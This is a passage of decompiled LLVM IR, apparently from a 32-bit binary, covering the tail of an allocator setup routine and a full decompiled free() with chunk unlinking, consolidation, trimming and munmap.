  %v1_804c99b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c999

dec_label_pc_804c999:                             ; preds = %dec_label_pc_804c98f, %dec_label_pc_804c994
  %v1_804c99b = phi i32 [ %v3_804c982, %dec_label_pc_804c98f ], [ %v1_804c99b.pre, %dec_label_pc_804c994 ]
  %v0_804c99b = phi i32 [ %v3_804c985, %dec_label_pc_804c98f ], [ %v0_804c994, %dec_label_pc_804c994 ]
  %v0_804c999 = load i32, i32* @edi, align 4
  %v1_804c999 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804c999 = add i32 %v1_804c999, %v0_804c999
  store i32 %v2_804c999, i32* @edi, align 4
  %v2_804c99b = add i32 %v1_804c99b, 12
  %v3_804c99b = inttoptr i32 %v2_804c99b to i32*
  store i32 %v0_804c99b, i32* %v3_804c99b, align 4
  %v0_804c99e = load i32, i32* @edx, align 4
  %v1_804c99e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c99e = add i32 %v1_804c99e, 8
  %v3_804c99e = inttoptr i32 %v2_804c99e to i32*
  store i32 %v0_804c99e, i32* %v3_804c99e, align 4
  br label %dec_label_pc_804c9a1

dec_label_pc_804c9a1:                             ; preds = %dec_label_pc_804c974, %dec_label_pc_804c999
  store i32 %v1_804c8ec, i32* %eax.global-to-local, align 4
  %v3_804c9a5 = load i32, i32* %v2_804c9a5, align 4
  store i32 %v3_804c9a5, i32* @edx, align 4
  %v0_804c9a8 = load i32, i32* @ecx, align 4
  store i32 %v0_804c9a8, i32* %v2_804c9a5, align 4
  %v0_804c9ab = load i32, i32* @edi, align 4
  %v1_804c9ad = or i32 %v0_804c9ab, 1
  store i32 %v1_804c9ad, i32* %eax.global-to-local, align 4
  %v0_804c9b0 = load i32, i32* @ecx, align 4
  %v1_804c9b0 = load i32, i32* @edx, align 4
  %v2_804c9b0 = add i32 %v1_804c9b0, 12
  %v3_804c9b0 = inttoptr i32 %v2_804c9b0 to i32*
  store i32 %v0_804c9b0, i32* %v3_804c9b0, align 4
  %v0_804c9b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c9b3 = load i32, i32* @ecx, align 4
  %v2_804c9b3 = add i32 %v1_804c9b3, 4
  %v3_804c9b3 = inttoptr i32 %v2_804c9b3 to i32*
  store i32 %v0_804c9b3, i32* %v3_804c9b3, align 4
  store i32 %v1_804c8ec, i32* %eax.global-to-local, align 4
  %v0_804c9ba = load i32, i32* @edx, align 4
  %v1_804c9ba = load i32, i32* @ecx, align 4
  %v2_804c9ba = add i32 %v1_804c9ba, 8
  %v3_804c9ba = inttoptr i32 %v2_804c9ba to i32*
  store i32 %v0_804c9ba, i32* %v3_804c9ba, align 4
  %v0_804c9bd = load i32, i32* %eax.global-to-local, align 4
  %v1_804c9bd = load i32, i32* @ecx, align 4
  %v2_804c9bd = add i32 %v1_804c9bd, 12
  %v3_804c9bd = inttoptr i32 %v2_804c9bd to i32*
  store i32 %v0_804c9bd, i32* %v3_804c9bd, align 4
  %v0_804c9c0 = load i32, i32* @edi, align 4
  %v1_804c9c0 = load i32, i32* @ecx, align 4
  %v3_804c9c0 = add i32 %v1_804c9c0, %v0_804c9c0
  %v4_804c9c0 = inttoptr i32 %v3_804c9c0 to i32*
  store i32 %v0_804c9c0, i32* %v4_804c9c0, align 4
  br label %dec_label_pc_804c9d5

dec_label_pc_804c9c5:                             ; preds = %dec_label_pc_804c964
  %v0_804c9c5 = load i32, i32* @edi, align 4
  %v2_804c9c5 = add i32 %v0_804c9c5, %v1_804c96c
  %v1_804c9c8 = or i32 %v2_804c9c5, 1
  store i32 %v1_804c9c8, i32* %eax.global-to-local, align 4
  %v1_804c9cb = load i32, i32* @ecx, align 4
  %v2_804c9cb = add i32 %v1_804c9cb, 4
  %v3_804c9cb = inttoptr i32 %v2_804c9cb to i32*
  store i32 %v1_804c9c8, i32* %v3_804c9cb, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804c9d2 = load i32, i32* @ecx, align 4
  store i32 %v0_804c9d2, i32* %v3_804c9d2, align 4
  br label %dec_label_pc_804c9d5

dec_label_pc_804c9d5:                             ; preds = %dec_label_pc_804c9a1, %dec_label_pc_804c9c5
  store i32 %v3_804c927, i32* @ecx, align 4
  %v1_804c9d9 = icmp eq i32 %v3_804c927, 0
  %v1_804c9db = icmp eq i1 %v1_804c9d9, false
  br i1 %v1_804c9db, label %dec_label_pc_804c927, label %dec_label_pc_804c9e1

dec_label_pc_804c9e1:                             ; preds = %dec_label_pc_804c9d5, %dec_label_pc_804c913
  store i32 %v4_804c90b, i32* @ecx, align 4
  %v15_804c9e5 = icmp eq i32 %v0_804c921, %v4_804c90b
  br i1 %v15_804c9e5, label %dec_label_pc_804ca69, label %dec_label_pc_804c9eb

dec_label_pc_804c9eb:                             ; preds = %dec_label_pc_804c9e1
  %v4_804c9eb = add i32 %v0_804c921, 4
  br label %dec_label_pc_804c913

dec_label_pc_804c9f5:                             ; preds = %dec_label_pc_804ca04.preheader, %dec_label_pc_804c9f5
  %v1_804c9f920 = phi i32 [ 1, %dec_label_pc_804ca04.preheader ], [ %v0_804ca04.pre, %dec_label_pc_804c9f5 ]
  %v2_804c9f9 = mul i32 %v1_804c9f920, 8
  %v4_804c9f9 = add i32 %v3_804c9f9, %v2_804c9f9
  store i32 %v4_804c9f9, i32* %eax.global-to-local, align 4
  %v1_804c9fd = add i32 %v1_804c9f920, 1
  store i32 %v1_804c9fd, i32* %edx.global-to-local, align 4
  %v2_804c9fe = add i32 %v4_804c9f9, 12
  %v3_804c9fe = inttoptr i32 %v2_804c9fe to i32*
  store i32 %v4_804c9f9, i32* %v3_804c9fe, align 4
  %v0_804ca01 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ca01 = add i32 %v0_804ca01, 8
  %v3_804ca01 = inttoptr i32 %v2_804ca01 to i32*
  store i32 %v0_804ca01, i32* %v3_804ca01, align 4
  %v0_804ca04.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804ca07 = icmp sgt i32 %v0_804ca04.pre, 95
  br i1 %v7_804ca07, label %dec_label_pc_804ca09, label %dec_label_pc_804c9f5

dec_label_pc_804ca09:                             ; preds = %dec_label_pc_804c9f5
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ca0d = add i32 %tmp11, 864
  %v2_804ca0d = inttoptr i32 %v1_804ca0d to i32*
  %v3_804ca0d = load i32, i32* %v2_804ca0d, align 4
  %v4_804ca0d = or i32 %v3_804ca0d, 1
  store i32 %v4_804ca0d, i32* %v2_804ca0d, align 4
  %v0_804ca14 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca14 = add i32 %v0_804ca14, 840
  %v2_804ca14 = inttoptr i32 %v1_804ca14 to i32*
  store i32 0, i32* %v2_804ca14, align 4
  %v0_804ca1e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca1e = add i32 %v0_804ca1e, 852
  %v2_804ca1e = inttoptr i32 %v1_804ca1e to i32*
  store i32 65536, i32* %v2_804ca1e, align 4
  %v0_804ca28 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca28 = add i32 %v0_804ca28, 844
  %v2_804ca28 = inttoptr i32 %v1_804ca28 to i32*
  store i32 262144, i32* %v2_804ca28, align 4
  %v0_804ca32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca32 = add i32 %v0_804ca32, 836
  %v2_804ca32 = inttoptr i32 %v1_804ca32 to i32*
  store i32 262144, i32* %v2_804ca32, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804ca43 = load i32, i32* %arg1, align 4
  %v1_804ca45 = urem i32 %v2_804ca43, 4
  %v1_804ca48 = or i32 %v1_804ca45, 72
  store i32 %v1_804ca48, i32* %arg1, align 4
  %v0_804ca4d = load i32, i32* @edx, align 4
  %v1_804ca4f = add i32 %v0_804ca4d, 52
  store i32 %v1_804ca4f, i32* %eax.global-to-local, align 4
  %v2_804ca52 = add i32 %v0_804ca4d, 44
  %v3_804ca52 = inttoptr i32 %v2_804ca52 to i32*
  store i32 %v1_804ca4f, i32* %v3_804ca52, align 4
  %v1_804ca57 = call i32 @sysconf(i32 30)
  store i32 %v1_804ca57, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804ca63 = add i32 %tmp11, 860
  %v3_804ca63 = inttoptr i32 %v2_804ca63 to i32*
  store i32 %v1_804ca57, i32* %v3_804ca63, align 4
  br label %dec_label_pc_804ca69

dec_label_pc_804ca69:                             ; preds = %dec_label_pc_804c9e1, %dec_label_pc_804ca09
  store i32 %v0_804c8cc, i32* @ebx, align 4
  store i32 %v0_804c8cb, i32* @esi, align 4
  store i32 %v0_804c8ca, i32* @edi, align 4
  %v0_804ca70 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ca70

; uselistorder directives
  uselistorder i32 %v0_804ca01, { 1, 0 }
  uselistorder i32 %v0_804c9c0, { 1, 0 }
  uselistorder i32 %v1_804c97b, { 1, 0 }
  uselistorder i32 %v2_804c974, { 1, 0 }
  uselistorder i32 %v1_804c96c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c978, { 1, 0 }
  uselistorder i32 %v3_804c927, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804c944, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804c921, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804c9d2, { 1, 0 }
  uselistorder i32 %v1_804c8ec, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804ca69, { 1, 0 }
  uselistorder label %dec_label_pc_804c9f5, { 1, 0 }
  uselistorder label %dec_label_pc_804c9d5, { 1, 0 }
  uselistorder label %dec_label_pc_804c9a1, { 1, 0 }
  uselistorder label %dec_label_pc_804c999, { 1, 0 }
  uselistorder label %dec_label_pc_804c964, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ca71 = load i32, i32* @ebp, align 4
  %v0_804ca72 = load i32, i32* @edi, align 4
  %v0_804ca73 = load i32, i32* @esi, align 4
  %v0_804ca74 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ca7c = icmp eq i32 %arg1, 0
  br i1 %v1_804ca7c, label %dec_label_pc_804cc05, label %dec_label_pc_804ca84

dec_label_pc_804ca84:                             ; preds = %entry
  %v2_804ca8f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ca8f, i32* @eax, align 4
  %v2_804ca94 = call i32 @__pthread_return_void(i32 %v2_804ca8f, i32 134534955)
  store i32 %v2_804ca94, i32* %eax.global-to-local, align 4
  %v1_804caa0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054210.341 to i32))
  %v1_804caa5 = add i32 %arg1, -8
  store i32 %v1_804caa5, i32* @ecx, align 4
  %v0_804caa8 = load i8, i8* @global_var_8056a40.342, align 1
  %v1_804caa8 = sext i8 %v0_804caa8 to i32
  store i32 %v1_804caa8, i32* %eax.global-to-local, align 4
  %v1_804cab0 = add i32 %arg1, -4
  %v2_804cab0 = inttoptr i32 %v1_804cab0 to i32*
  %v3_804cab0 = load i32, i32* %v2_804cab0, align 4
  %v1_804cab5 = and i32 %v3_804cab0, -4
  %v4_804cab5 = trunc i32 %v1_804cab5 to i8
  store i32 %v1_804cab5, i32* @ebx, align 4
  %v8_804caba = icmp ugt i8 %v4_804cab5, %v0_804caa8
  br i1 %v8_804caba, label %dec_label_pc_804cadc, label %dec_label_pc_804cabc

dec_label_pc_804cabc:                             ; preds = %dec_label_pc_804ca84
  %v2_804cabc = udiv i32 %v3_804cab0, 8
  %v1_804cabf = or i32 %v1_804caa8, 3
  %v3_804cabf = trunc i32 %v1_804cabf to i8
  store i32 %v1_804cabf, i32* %eax.global-to-local, align 4
  store i8 %v3_804cabf, i8* @global_var_8056a40.342, align 64
  %v1_804cac7 = mul nuw i32 %v2_804cabc, 4
  %v2_804cac7 = add i32 %v1_804cac7, ptrtoint (i8* @global_var_8056a40.342 to i32)
  store i32 %v2_804cac7, i32* @edx, align 4
  %v1_804cace = add i32 %v1_804cac7, add (i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32 -4)
  %v2_804cace = inttoptr i32 %v1_804cace to i32*
  %v3_804cace = load i32, i32* %v2_804cace, align 4
  store i32 %v3_804cace, i32* %eax.global-to-local, align 4
  %v3_804cad1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804cace, i32* %v3_804cad1, align 4
  %v0_804cad4 = load i32, i32* @ecx, align 4
  %v1_804cad4 = load i32, i32* @edx, align 4
  %v2_804cad4 = add i32 %v1_804cad4, -4
  %v3_804cad4 = inttoptr i32 %v2_804cad4 to i32*
  store i32 %v0_804cad4, i32* %v3_804cad4, align 4
  br label %dec_label_pc_804cbf4

dec_label_pc_804cadc:                             ; preds = %dec_label_pc_804ca84
  %v1_804cadc = trunc i32 %v3_804cab0 to i8
  %v2_804cadc = and i8 %v1_804cadc, 2
  %v3_804cadc = icmp eq i8 %v2_804cadc, 0
  %v5_804cadc = zext i8 %v2_804cadc to i32
  %v7_804cadc = and i32 %v3_804cab0, -256
  %v8_804cadc = or i32 %v5_804cadc, %v7_804cadc
  store i32 %v8_804cadc, i32* @edx, align 4
  %v1_804cadf = icmp eq i1 %v3_804cadc, false
  br i1 %v1_804cadf, label %dec_label_pc_804cbd4, label %dec_label_pc_804cae5

dec_label_pc_804cae5:                             ; preds = %dec_label_pc_804cadc
  %v1_804cae5 = or i32 %v1_804caa8, 1
  %v3_804cae5 = trunc i32 %v1_804cae5 to i8
  store i32 %v1_804cae5, i32* %eax.global-to-local, align 4
  %v2_804cae8 = add i32 %v1_804cab5, %v1_804caa5
  store i32 %v2_804cae8, i32* @esi, align 4
  store i8 %v3_804cae5, i8* @global_var_8056a40.342, align 64
  %v1_804caf0 = add i32 %v2_804cae8, 4
  %v2_804caf0 = inttoptr i32 %v1_804caf0 to i32*
  %v3_804caf0 = load i32, i32* %v2_804caf0, align 4
  store i32 %v3_804caf0, i32* %eax.global-to-local, align 4
  %v2_804caf7 = inttoptr i32 %v1_804cab0 to i8*
  %v3_804caf7 = load i8, i8* %v2_804caf7, align 1
  %v4_804caf7 = urem i8 %v3_804caf7, 2
  %v5_804caf7 = icmp eq i8 %v4_804caf7, 0
  %v1_804cafb = icmp eq i1 %v5_804caf7, false
  br i1 %v1_804cafb, label %dec_label_pc_804cb1e, label %dec_label_pc_804cafd

dec_label_pc_804cafd:                             ; preds = %dec_label_pc_804cae5
  %v2_804cafd = inttoptr i32 %v1_804caa5 to i32*
  %v3_804cafd = load i32, i32* %v2_804cafd, align 4
  store i32 %v3_804cafd, i32* @ebp, align 4
  %v2_804cb02 = sub i32 %v1_804caa5, %v3_804cafd
  store i32 %v2_804cb02, i32* %eax.global-to-local, align 4
  %v1_804cb04 = add i32 %v2_804cb02, 8
  %v2_804cb04 = inttoptr i32 %v1_804cb04 to i32*
  %v3_804cb04 = load i32, i32* %v2_804cb04, align 4
  store i32 %v3_804cb04, i32* @edi, align 4
  %v1_804cb07 = add i32 %v2_804cb02, 12
  %v2_804cb07 = inttoptr i32 %v1_804cb07 to i32*
  %v3_804cb07 = load i32, i32* %v2_804cb07, align 4
  store i32 %v3_804cb07, i32* @edx, align 4
  %v1_804cb0a = add i32 %v3_804cb04, 12
  %v2_804cb0a = inttoptr i32 %v1_804cb0a to i32*
  %v3_804cb0a = load i32, i32* %v2_804cb0a, align 4
  store i32 %v3_804cb0a, i32* @ecx, align 4
  %v12_804cb0d = icmp eq i32 %v3_804cb0a, %v2_804cb02
  %v1_804cb0f = icmp eq i1 %v12_804cb0d, false
  br i1 %v1_804cb0f, label %dec_label_pc_804cb4d, label %dec_label_pc_804cb11

dec_label_pc_804cb11:                             ; preds = %dec_label_pc_804cafd
  %v1_804cb11 = add i32 %v3_804cb07, 8
  %v2_804cb11 = inttoptr i32 %v1_804cb11 to i32*
  %v3_804cb11 = load i32, i32* %v2_804cb11, align 4
  %v15_804cb11 = icmp eq i32 %v3_804cb11, %v3_804cb0a
  %v1_804cb14 = icmp eq i1 %v15_804cb11, false
  br i1 %v1_804cb14, label %dec_label_pc_804cb4d, label %dec_label_pc_804cb16

dec_label_pc_804cb16:                             ; preds = %dec_label_pc_804cb11
  %v2_804cb16 = add i32 %v3_804cafd, %v1_804cab5
  store i32 %v2_804cb16, i32* @ebx, align 4
  store i32 %v3_804cb07, i32* %v2_804cb0a, align 4
  %v0_804cb1b = load i32, i32* @edi, align 4
  %v1_804cb1b = load i32, i32* @edx, align 4
  %v2_804cb1b = add i32 %v1_804cb1b, 8
  %v3_804cb1b = inttoptr i32 %v2_804cb1b to i32*
  store i32 %v0_804cb1b, i32* %v3_804cb1b, align 4
  %v0_804cb25.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cb1e

dec_label_pc_804cb1e:                             ; preds = %dec_label_pc_804cae5, %dec_label_pc_804cb16
  %v1_804cb31 = phi i32 [ %v2_804cae8, %dec_label_pc_804cae5 ], [ %v0_804cb25.pre, %dec_label_pc_804cb16 ]
  %v1_804cb22 = and i32 %v3_804caf0, -4
  store i32 %v1_804cb22, i32* @ebp, align 4
  %v1_804cb25 = load i32, i32* @global_var_8056a6c.343, align 4
  %v12_804cb25 = icmp eq i32 %v1_804cb31, %v1_804cb25
  br i1 %v12_804cb25, label %dec_label_pc_804cb7f, label %dec_label_pc_804cb2d

dec_label_pc_804cb2d:                             ; preds = %dec_label_pc_804cb1e
  %v2_804cb2d = add i32 %v1_804cb31, 4
  %v3_804cb2d = add i32 %v2_804cb2d, %v1_804cb22
  %v4_804cb2d = inttoptr i32 %v3_804cb2d to i32*
  %v5_804cb2d = load i32, i32* %v4_804cb2d, align 4
  store i32 %v5_804cb2d, i32* %eax.global-to-local, align 4
  %v3_804cb31 = inttoptr i32 %v2_804cb2d to i32*
  store i32 %v1_804cb22, i32* %v3_804cb31, align 4
  %v0_804cb34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb34 = urem i32 %v0_804cb34, 2
  %v2_804cb34 = icmp eq i32 %v1_804cb34, 0
  store i32 %v1_804cb34, i32* %eax.global-to-local, align 4
  %v1_804cb39 = icmp eq i1 %v2_804cb34, false
  br i1 %v1_804cb39, label %dec_label_pc_804cb5a, label %dec_label_pc_804cb3b

dec_label_pc_804cb3b:                             ; preds = %dec_label_pc_804cb2d
  %v0_804cb3b = load i32, i32* @esi, align 4
  %v1_804cb3b = add i32 %v0_804cb3b, 8
  %v2_804cb3b = inttoptr i32 %v1_804cb3b to i32*
  %v3_804cb3b = load i32, i32* %v2_804cb3b, align 4
  store i32 %v3_804cb3b, i32* @edx, align 4
  %v1_804cb3e = add i32 %v0_804cb3b, 12
  %v2_804cb3e = inttoptr i32 %v1_804cb3e to i32*
  %v3_804cb3e = load i32, i32* %v2_804cb3e, align 4
  store i32 %v3_804cb3e, i32* %eax.global-to-local, align 4
  %v1_804cb41 = add i32 %v3_804cb3b, 12
  %v2_804cb41 = inttoptr i32 %v1_804cb41 to i32*
  %v3_804cb41 = load i32, i32* %v2_804cb41, align 4
  store i32 %v3_804cb41, i32* @edi, align 4
  %v12_804cb44 = icmp eq i32 %v3_804cb41, %v0_804cb3b
  %v1_804cb46 = icmp eq i1 %v12_804cb44, false
  br i1 %v1_804cb46, label %dec_label_pc_804cb4d, label %dec_label_pc_804cb48

dec_label_pc_804cb48:                             ; preds = %dec_label_pc_804cb3b
  %v1_804cb48 = add i32 %v3_804cb3e, 8
  %v2_804cb48 = inttoptr i32 %v1_804cb48 to i32*
  %v3_804cb48 = load i32, i32* %v2_804cb48, align 4
  %v15_804cb48 = icmp eq i32 %v3_804cb48, %v3_804cb41
  br i1 %v15_804cb48, label %dec_label_pc_804cb52, label %dec_label_pc_804cb4d

dec_label_pc_804cb4d:                             ; preds = %dec_label_pc_804cb48, %dec_label_pc_804cb3b, %dec_label_pc_804cb11, %dec_label_pc_804cafd
  %v0_804cb4d = call i32 @abort()
  store i32 %v0_804cb4d, i32* %eax.global-to-local, align 4
  %v1_804cb52.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804cb52

dec_label_pc_804cb52:                             ; preds = %dec_label_pc_804cb48, %dec_label_pc_804cb4d
  %v1_804cb52 = phi i32 [ %v3_804cb3b, %dec_label_pc_804cb48 ], [ %v1_804cb52.pre, %dec_label_pc_804cb4d ]
  %v0_804cb52 = phi i32 [ %v3_804cb3e, %dec_label_pc_804cb48 ], [ %v0_804cb4d, %dec_label_pc_804cb4d ]
  %v2_804cb52 = add i32 %v1_804cb52, 12
  %v3_804cb52 = inttoptr i32 %v2_804cb52 to i32*
  store i32 %v0_804cb52, i32* %v3_804cb52, align 4
  %v0_804cb55 = load i32, i32* @edx, align 4
  %v1_804cb55 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cb55 = add i32 %v1_804cb55, 8
  %v3_804cb55 = inttoptr i32 %v2_804cb55 to i32*
  store i32 %v0_804cb55, i32* %v3_804cb55, align 4
  %v0_804cb58 = load i32, i32* @ebx, align 4
  %v1_804cb58 = load i32, i32* @ebp, align 4
  %v2_804cb58 = add i32 %v1_804cb58, %v0_804cb58
  store i32 %v2_804cb58, i32* @ebx, align 4
  br label %dec_label_pc_804cb5a

dec_label_pc_804cb5a:                             ; preds = %dec_label_pc_804cb2d, %dec_label_pc_804cb52
  %v0_804cb5a = load i32, i32* @global_var_8056a7c.361, align 4
  store i32 %v0_804cb5a, i32* %eax.global-to-local, align 4
  %v0_804cb5f = load i32, i32* @ecx, align 4
  %v1_804cb5f = add i32 %v0_804cb5f, 12
  %v2_804cb5f = inttoptr i32 %v1_804cb5f to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804cb5f, align 4
  %v0_804cb66 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb66 = load i32, i32* @ecx, align 4
  %v2_804cb66 = add i32 %v1_804cb66, 8
  %v3_804cb66 = inttoptr i32 %v2_804cb66 to i32*
  store i32 %v0_804cb66, i32* %v3_804cb66, align 4
  %v0_804cb69 = load i32, i32* @ebx, align 4
  %v1_804cb69 = load i32, i32* @ecx, align 4
  %v3_804cb69 = add i32 %v1_804cb69, %v0_804cb69
  %v4_804cb69 = inttoptr i32 %v3_804cb69 to i32*
  store i32 %v0_804cb69, i32* %v4_804cb69, align 4
  %v0_804cb6c = load i32, i32* @ecx, align 4
  %v1_804cb6c = load i32, i32* %eax.global-to-local, align 4
  %v2_804cb6c = add i32 %v1_804cb6c, 12
  %v3_804cb6c = inttoptr i32 %v2_804cb6c to i32*
  store i32 %v0_804cb6c, i32* %v3_804cb6c, align 4
  %v0_804cb6f = load i32, i32* @ebx, align 4
  %v1_804cb71 = or i32 %v0_804cb6f, 1
  store i32 %v1_804cb71, i32* %eax.global-to-local, align 4
  %v0_804cb74 = load i32, i32* @ecx, align 4
  store i32 %v0_804cb74, i32* @global_var_8056a7c.361, align 4
  %v2_804cb7a = add i32 %v0_804cb74, 4
  %v3_804cb7a = inttoptr i32 %v2_804cb7a to i32*
  store i32 %v1_804cb71, i32* %v3_804cb7a, align 4
  br label %dec_label_pc_804cb8f

dec_label_pc_804cb7f:                             ; preds = %dec_label_pc_804cb1e
  %v0_804cb7f = load i32, i32* @ebx, align 4
  %v2_804cb7f = add i32 %v0_804cb7f, %v1_804cb22
  store i32 %v2_804cb7f, i32* @ebx, align 4
  %v1_804cb83 = or i32 %v2_804cb7f, 1
  store i32 %v1_804cb83, i32* %eax.global-to-local, align 4
  %v1_804cb86 = load i32, i32* @ecx, align 4
  %v2_804cb86 = add i32 %v1_804cb86, 4
  %v3_804cb86 = inttoptr i32 %v2_804cb86 to i32*
  store i32 %v1_804cb83, i32* %v3_804cb86, align 4
  %v0_804cb89 = load i32, i32* @ecx, align 4
  store i32 %v0_804cb89, i32* @global_var_8056a6c.343, align 4
  br label %dec_label_pc_804cb8f

dec_label_pc_804cb8f:                             ; preds = %dec_label_pc_804cb5a, %dec_label_pc_804cb7f
  %v0_804cb8f = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804cb8f, 131072
  br i1 %tmp21, label %dec_label_pc_804cbf4, label %dec_label_pc_804cb97

dec_label_pc_804cb97:                             ; preds = %dec_label_pc_804cb8f
  %v0_804cb97 = load i8, i8* @global_var_8056a40.342, align 64
  %v1_804cb97 = and i8 %v0_804cb97, 2
  %v2_804cb97 = icmp eq i8 %v1_804cb97, 0
  br i1 %v2_804cb97, label %dec_label_pc_804cbb0, label %dec_label_pc_804cba0

dec_label_pc_804cba0:                             ; preds = %dec_label_pc_804cb97
  %v2_804cba8 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8056a40.342 to i32*))
  store i32 %v2_804cba8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbb0

dec_label_pc_804cbb0:                             ; preds = %dec_label_pc_804cb97, %dec_label_pc_804cba0
  %v0_804cbb0 = load i32, i32* @global_var_8056a6c.343, align 4
  store i32 %v0_804cbb0, i32* %eax.global-to-local, align 4
  %v1_804cbb5 = add i32 %v0_804cbb0, 4
  %v2_804cbb5 = inttoptr i32 %v1_804cbb5 to i32*
  %v3_804cbb5 = load i32, i32* %v2_804cbb5, align 4
  %v1_804cbb8 = and i32 %v3_804cbb5, -4
  store i32 %v1_804cbb8, i32* %eax.global-to-local, align 4
  %v1_804cbbb = load i32, i32* @global_var_8056d84.359, align 4
  %v7_804cbbb = icmp ult i32 %v1_804cbb8, %v1_804cbbb
  br i1 %v7_804cbbb, label %dec_label_pc_804cbf4, label %dec_label_pc_804cbc3

dec_label_pc_804cbc3:                             ; preds = %dec_label_pc_804cbb0
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* @edx, align 4
  %v0_804cbc8 = load i32, i32* @global_var_8056d88.357, align 8
  store i32 %v0_804cbc8, i32* @eax, align 4
  %v0_804cbcd = call i32 @__malloc_trim()
  store i32 %v0_804cbcd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbf4

dec_label_pc_804cbd4:                             ; preds = %dec_label_pc_804cadc
  %v2_804cbd4 = inttoptr i32 %v1_804caa5 to i32*
  %v3_804cbd4 = load i32, i32* %v2_804cbd4, align 4
  %v0_804cbd7 = load i32, i32* @global_var_8056d90.350, align 16
  %v1_804cbd7 = add i32 %v0_804cbd7, -1
  store i32 %v1_804cbd7, i32* @global_var_8056d90.350, align 16
  %v2_804cbdd = add i32 %v3_804cbd4, %v1_804cab5
  store i32 %v2_804cbdd, i32* %eax.global-to-local, align 4
  %v2_804cbe0 = sub i32 %v1_804caa5, %v3_804cbd4
  %v0_804cbe6 = load i32, i32* @global_var_8056da4.353, align 4
  %v2_804cbe6 = sub i32 %v0_804cbe6, %v2_804cbdd
  store i32 %v2_804cbe6, i32* @global_var_8056da4.353, align 4
  %v4_804cbec = call i32 @munmap(i32 %v2_804cbe0, i32 %v2_804cbdd, i32 %v1_804cab5, i32 %v1_804cab5)
  store i32 %v4_804cbec, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbf4

dec_label_pc_804cbf4:                             ; preds = %dec_label_pc_804cbb0, %dec_label_pc_804cb8f, %dec_label_pc_804cbc3, %dec_label_pc_804cabc, %dec_label_pc_804cbd4
  store i32 %v2_804ca8f, i32* @eax, align 4
  %v2_804cbfd = call i32 @__pthread_return_void(i32 %v2_804ca8f, i32 1)
  store i32 %v2_804cbfd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc05

dec_label_pc_804cc05:                             ; preds = %entry, %dec_label_pc_804cbf4
  %.0 = phi i32 [ undef, %entry ], [ %v2_804cbfd, %dec_label_pc_804cbf4 ]
  store i32 %v0_804ca74, i32* @ebx, align 4
  store i32 %v0_804ca73, i32* @esi, align 4
  store i32 %v0_804ca72, i32* @edi, align 4
  store i32 %v0_804ca71, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804cbd4, { 1, 0 }
  uselistorder i32 %v0_804cb69, { 1, 0 }
  uselistorder i32 %v1_804cb34, { 1, 0 }
  uselistorder i32 %v2_804cb2d, { 1, 0 }
  uselistorder i32 %v1_804cb22, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804cb31, { 1, 0 }
  uselistorder i32 %v1_804cab5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804cab0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804caa5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056a40.342 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056a74.345 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8056a6c.343, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8054210.341 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
